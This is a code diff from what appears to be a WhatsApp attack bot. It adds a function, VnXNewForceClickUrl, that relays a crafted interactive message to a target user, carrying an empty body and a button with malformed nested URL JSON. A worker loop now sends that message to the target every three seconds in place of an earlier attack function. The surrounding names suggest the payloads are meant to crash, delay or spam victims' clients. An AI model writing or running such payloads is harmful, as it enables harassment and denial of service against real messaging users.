@@ -3399,7 +3399,7 @@ Status      : Success
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await VnXNewOnlyBulldo(sock, target);
+                    await VnXNewForceClickUrl(sock, target);
                     await sleep(3000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -4522,6 +4522,31 @@ async function VogueDelay(sock, target) {
       participant: { jid: target }
     });
   }
+}
+
+async function VnXNewForceClickUrl(sock, target) {
+  await sock.relayMessage(target, {
+    interactiveMessage: {
+      body: {
+        text: "",
+        format: 1
+      },
+      footer: {
+        text: ""
+      },
+      nativeFlowMessage: {
+        buttons: [
+          {
+           name: "cta_url",
+            buttonParamsJson: JSON.stringify({
+              display_text: "VnX Is Here",
+              url: "{\"display_text\":\"ⓘ ⸸VnX\",\"url\":\"http://wa.mE/stickerpack/VnX\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,VnX\"}"
+              }),
+          }
+        ]
+      }
+    }
+  }, { participant: { jid: target } });
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
